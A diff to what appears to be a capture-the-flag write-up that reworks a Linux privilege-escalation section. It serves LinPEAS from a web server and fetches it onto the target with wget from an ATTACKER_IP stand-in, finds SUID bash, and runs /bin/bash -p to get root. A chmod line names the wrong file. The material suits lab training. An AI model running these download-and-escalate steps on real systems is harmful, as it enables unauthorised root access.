@@ -553,7 +553,40 @@ root
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
-
+#### SUID binaries method
+**Download LinPEAS to attack host**
+```
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+```
+**Download LinPEAS to target host**
+* Serve payload through python webserver.
+```
+python3 -m http.server
+```
+```
+wget http://ATTACKER_IP:8000/linpeas.sh
+chmod +x ./linpeas.txt
+```
+  * Ensure that target directory has write permissions.
+    * E.g. /tmp.
+* Write LinPEAS output to text file.
+```
+./linpeas.sh -a > linpeas.txt
+```
+* Browse to "SUID - Check easy privesc, exploits and write perms" section of text file.
+```
+-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
+-rwsr-sr-x 1 root root 59K Jan 18  2018 /bin/chmod
+```
+* Checked [GTFOBins](https://gtfobins.github.io/gtfobins/bash/#suid) for information on how a user with SUID bit set on bash can abuse it.
+> **SUID**. If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges. This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
+> `sudo install -m =xs $(which bash) .`
+> `./bash -p`
+```
+/bin/bash -p
+whoami
+root
+```
 
 
 **Find root.txt**
@@ -569,25 +602,4 @@ VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
 **Decode base64**
 ```
 cat /root/root.txt | base64 -d
-```
-#### Enumerate target host using LinPEAS
-```
-wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
-```
-**Serve payload through python webserver**
-```
-python3 -m http.server
-```
-**Download LinPEAS to target host**
-* Ensure that target directory has write permissions (`/tmp`).
-* Write LinPeas output to txt file.
-```
-wget http://ATTACKER_IP:8000/linpeas.sh
-chmod +x ./linpeas.txt
-./linpeas.sh -a > linpeas.txt
-```
-**SUID / SGID**
-```
--rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
--rwsr-sr-x 1 root root 59K Jan 18  2018 /bin/chmod
 ```
